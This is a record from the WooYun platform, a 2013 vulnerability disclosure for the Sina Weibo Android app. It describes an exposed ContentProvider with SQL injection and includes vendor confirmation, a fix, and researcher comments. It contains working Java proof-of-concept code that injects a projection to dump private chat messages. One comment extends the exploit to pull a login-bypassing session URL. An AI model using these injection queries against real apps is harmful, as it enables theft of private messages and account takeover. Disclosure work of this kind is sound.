{"id": 14566, "wybug_id": "wooyun-2013-016854", "wybug_title": "新浪微博Android应用本地信息泄露", "wybug_corp": "新浪", "wybug_author": "kelwin", "wybug_date": "2013-01-02 22:24", "wybug_open_date": "2013-02-16 22:25", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-16：\t细节向公众公开  简要描述： 任意Android程序不需要任何权限就能获取本机新浪微博应用的所有数据，包括账号、私信聊天记录 详细说明：  组件ContentProvider暴露、另外有SQL注入漏洞。   漏洞证明：  \npublic void getChatMsg() {    \tString[] projection = {\"* from im_message_table--\"};    \t    \tUri uri = Uri.parse(\"content://com.sina.weibo.blogProvider/query/im\");    \tCursor mCursor = getContentResolver().query(uri, projection, null, null, null);    \tif (null == mCursor) {    \t\tToast.makeText(mContext, \"null cursor\", Toast.LENGTH_SHORT).show();    \t} else if (mCursor.getCount() < 1) {    \t\tToast.makeText(mContext, \"count less than 1\", Toast.LENGTH_SHORT).show();    \t} else {    \t\t//String[] columNames = mCursor.getColumnNames();    \t\tString text = \"\";    \t\twhile (mCursor.moveToNext()) {    \t        text += mCursor.getString(mCursor.getColumnIndex(\"content\"));    \t    }    \t\tmTextView.setText(text);    \t}    }\n写个不用任何权限的app在已经安装新浪微博客户端的Android手机上运行上述代码，就能看到聊天记录。。   修复方案：  检查projection和selection，防止注入，另外为ContentProvider添加权限；或者禁止一些外部访问。   版权声明：转载请注明来源 kelwin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-01-05 10:10 厂商回复： 多谢提供，正在跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-03 00:22 |    \t\thellok \t\t\t( 普通白帽子  |\t\t\t        Rank:123 漏洞数:10        | 酱油党路过)\t\t \n  围观KELWIN牛~    \n     2013-01-03 01:44 |    \t\thqdvista \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:31        | N/A)\t\t \n  围观KELWIN牛~    \n     2013-01-03 01:45 |    \t\thqdvista \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:31        | N/A)\t\t \n  目测是sd卡    \n     2013-01-03 11:09 |    \t\t0x00de \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 一个二逼，2到家了的小白。)\t\t \n  @hqdvista 同意    \n     2013-01-03 12:02 |    \t\tkelwin \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | blue-lotus战队成员)\t\t \n  @hqdvista 不是啊    \n     2013-01-03 19:37 |    \t\tClaud \t\t\t( 普通白帽子  |\t\t\t        Rank:161 漏洞数:18        | secmobi.com)\t\t \n  哈哈，如果是SD卡，这个就不值得发了    \n     2013-02-17 18:38 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @Claud 你推荐的果然没错...话说ContentProvider好像URL，当年无聊写框架demo时，曾经设想过这么搞，但发现效率成问题...    \n     2013-03-06 10:15 |    \t\tSeaRobber \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | Android安全)\t\t \n  如果改成下面的表和列，就可以直接获取到控制微博的URL（含有ssid的绕过登陆的url哦！）PC端登陆此url可发送、删除私信，取消及关注微博等等！！String[] projection = {\"* from user_info_table_v2--\"};... text += mCursor.getString(mCursor.getColumnIndex(\"usermsgurl\"));    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}